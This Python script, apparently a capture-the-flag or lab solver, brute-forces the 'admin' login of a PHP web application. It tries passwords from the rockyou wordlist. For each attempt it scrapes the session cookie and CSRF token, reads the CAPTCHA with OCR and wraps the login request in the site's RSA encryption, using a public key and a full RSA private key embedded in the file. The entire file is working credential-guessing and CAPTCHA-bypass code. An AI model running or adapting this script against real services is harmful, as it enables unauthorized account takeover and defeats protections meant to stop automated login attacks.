import base64
from urllib.parse import urlencode

import cv2
import pytesseract
import requests
from bs4 import BeautifulSoup
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA

BASE_URL = ""  # --- Insert the target server URL here ---

with open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin-1") as f:
    data = f.read()

username = "admin"

# --- Server keys (taken from script.js) ---

public_key_pem = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAt38SAt9XfLRClH+41yxl
NIEOrHcZjGjrZZVV/R/XcuFJI2bBInWrmcnrQguajtO1tehWrdSCto+kP6wI2NyR
qL8tpuovK6SO1KT+TpkceeZyJIN+QGnp19pbLeDG3xZXK94AKxB0xH59DWHWcHNs
ktLz3RnW4xX+YI3o5hn/fcgPrxQ6kK4jYPm0xtbIYtcc86zH9+Cv6R+Y0rwfAXtG
0+YAJDYYRo0Aro1uV2zCG/9Khy/Dxrvm3Qc4OAidZsoS6dFv+0/Hp3UxF8FfAExw
Iwfx6YKfiC4xpGuDlxkyuP90L9T0Ke8KPfKhAqc5+aHE0EqYkXDRQQVrF5fmjdRk
LwIDAQAB
-----END PUBLIC KEY-----"""

private_key_pem = """-----BEGIN PRIVATE KEY-----
MIIEuwIBADANBgkqhkiG9w0BAQEFAASCBKUwggShAgEAAoIBAQC1DwWR7yGlsNpg
YaBHWheqnLoZvGuSr3MWcZyoHrql5iwzzOolmu00WwaGiuOwPyl4GjRCR4rwXpGq
sMJiYuwOG6w9gPzIDg1Y11cPtkqzxZ20kX/8DFFlGiurwAK6SOkrtfhLYF56YDJg
WS7lVwtVq5LstdzSeTEtvSFdhNedUZW8l319AYJGjByXwNMUW3u21wGff8hDN8Yu
AMrciW1UJFO2aN39v8Vev1VrAvRItFK1znCq0eNRJKjruEztXO/vZzR8Lc0BA0Uj
OyIizkEQKBx5/OTRf8rqO5CkqcLcr/f0u4ZlH6cJg9jOVJlTeb37S94d3uSx+4Pb
EIw+/Hm7AgMBAAECgf8ICgCTLWjRDCLINdG9WUs8P4YD0bfB1BmDy/8PEYFrQrNv
dzrMG1CgHBU2n9HztJX4HQ+bWTyFPHp/iJ3lr1yYmRlqkJxkZ7LJnOg4KD3CeWGg
zX+2l6I4wV+mfE74B4j9gXTAjrGBEtVuC1R4pykEV/e/JHYpjOKqpTsi0kMm9LH5
a3eiLKtP+zAL+s7DEQopALi2oEq5/0+hJxZVYUX0P6q+A/o5kdheXeWjEuL9nUDR
YM/bcnAOKTE9B7+sZ5SUGDwf6L+MpTBLN7rnNvli6mykmvYwCeFYOKAVXjcFWRg1
3kR0yVxkpPBXC97CZyRsYiRHiYEzRKZo5eHRhHkCgYEA7nPGUNhHtXeT5oIurZgJ
K/FePMzgBxbDXtbAHEpw378Y90BjUUB7YxAZxhiTO1wKsAWhr1VQOdWmqlTrhurN
/XGxrpMuDRuNkYbXjjvmv4SpdgW5YnXR9BA1bjwWbuEoqsLu//oNySrbLVlYP2he
Q3rXeCN2BZDStte2D6VrQukCgYEAwmIBCOjaBWh8VnxnoSsSdjUf1/oXAIzKpEwO
waZadwsqau3ITARGjz0cMuV8s7gXAU6fskXqIMvaAxvr1/GXfoIGTSuSwNRW0MKI
k26HK++R7TPISLXC1PpF33z+uBRi6wiYeRsG+Jo5l4pW9fD4KBSFs2P9H5njWeW+
hH0MiQMCgYEAzCJvD3zoftDc3ARsw44Zo/XhUDmwPEFfhgxgsJeF4/ZsABeuLrv+
JYN+HRmiybl1KNXZYgmuQaTHJqDGdV0EdclkbGhxjyUcYA5I8OoVE7YVgQVLfKAS
2lcZ9sIYDlpRf0acZqWCMcqvkjYfl0DZGfnLBn2NJxyhV4h5wxFBLykCgYAJ9zxW
WJnU7SZyyK4HdU3dAZxAVnIXdSBui/e1tfGtaMUj9kzumMmFTnzDn0Bldmq3hnBp
k2wNgmYLAsN0rs41jjUEf9dmS3yn91FJPcFwXzf8EUuTbr4ubSZn7uCgT2tC4Y3v
p5MT69RIEK+krFYMuACi0d2IYTtmwICkCkU6QQKBgGlXG0c681f1lYVAVryEszrO
We9+VRrO3pDiyY348HBdwyyXpn7vfK+fF5C+prDEtO5IQ6v/tdeYfzKVa0iZhIUF
kp2XdXBSHm7ykeY5LYUAjhoShT2Y3gT1oEH5DjqdTA0oJ0DSvbzMchi+uO5e0ZHO
xuASizGvaR+gZ9+ANTmJ
-----END PRIVATE KEY-----"""

public_key = RSA.import_key(public_key_pem)
encrypt_cipher = PKCS1_v1_5.new(public_key)

private_key = RSA.import_key(private_key_pem)
decrypt_cipher = PKCS1_v1_5.new(private_key)


def encrypt_data(plain_text: str) -> str:
    encrypted = encrypt_cipher.encrypt(plain_text.encode("utf-8"))
    return base64.b64encode(encrypted).decode()


def decrypt_data(encrypted_data: str) -> str:
    try:
        decrypted = decrypt_cipher.decrypt(base64.b64decode(encrypted_data), None)
        if decrypted is None:
            return "Decryption Failed"
        return decrypted.decode("utf-8")
    except Exception:
        return "Decryption Failed"


def solve_captcha(image_path: str) -> str:
    # Binarization removes blur before recognition
    img = cv2.imread(image_path, 0)
    _, binary_img = cv2.threshold(img, 180, 255, cv2.THRESH_BINARY)

    custom_config = (
        r"--oem 3 --psm 7 "
        r"-c tessedit_char_whitelist=0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    )
    text = pytesseract.image_to_string(binary_img, lang="eng", config=custom_config)
    return text.strip().replace(" ", "")


def get_session_and_csrf():
    get_request = requests.get(f"{BASE_URL}/index.php?error=true")
    session_id = get_request.cookies.get("PHPSESSID")
    soup = BeautifulSoup(get_request.text, "html.parser")
    csrf_token = soup.find("input", {"id": "csrf_token"})["value"]
    return session_id, csrf_token


def get_captcha_image(session_id: str) -> None:
    headers = {
        "Accept": "image/avif,image/webp,image/png,*/*",
        "Referer": f"{BASE_URL}/index.php?error=true",
        "User-Agent": "Mozilla/5.0",
        "Cookie": f"PHPSESSID={session_id}",
    }
    captcha_request = requests.get(f"{BASE_URL}/captcha.php", headers=headers)
    if captcha_request.headers.get("Content-Type", "").startswith("image/"):
        with open("captcha.png", "wb") as f:
            f.write(captcha_request.content)


def try_login(session_id: str, csrf_token: str, password: str, captcha_input: str) -> str:
    params = {
        "action": "login",
        "csrf_token": csrf_token,
        "username": username,
        "password": password,
        "captcha_input": captcha_input,
    }
    plain = urlencode(params)
    encrypted_params = encrypt_data(plain)

    headers_post = {
        "Content-Type": "application/json",
        "Referer": f"{BASE_URL}/index.php?error=true",
        "User-Agent": "Mozilla/5.0",
        "Cookie": f"PHPSESSID={session_id}",
    }
    post_request = requests.post(
        f"{BASE_URL}/server.php",
        headers=headers_post,
        json={"data": encrypted_params},
    )

    try:
        response_json = post_request.json()
        ciphertext_b64 = response_json.get("data") or next(iter(response_json.values()))
    except ValueError:
        ciphertext_b64 = post_request.text.strip()

    return decrypt_data(ciphertext_b64)


def main():
    for i, password in enumerate(data.split("\n")[:100], start=1):
        result = "CAPTCHA incorrect."

        # Keep retrying until the captcha is read correctly (the server won't respond otherwise)
        while result == "CAPTCHA incorrect.":
            session_id, csrf_token = get_session_and_csrf()
            get_captcha_image(session_id)
            captcha_input = solve_captcha("captcha.png")
            result = try_login(session_id, csrf_token, password, captcha_input)

        print(f"pass_count: {i} | username: {username} | password: {password!r} | status: {result}")

        if result != "Login failed!":
            # Neither "CAPTCHA incorrect" nor "Login failed" — password found
            print(f"[+] Password found: {password!r}")
            break


if __name__ == "__main__":
    main()
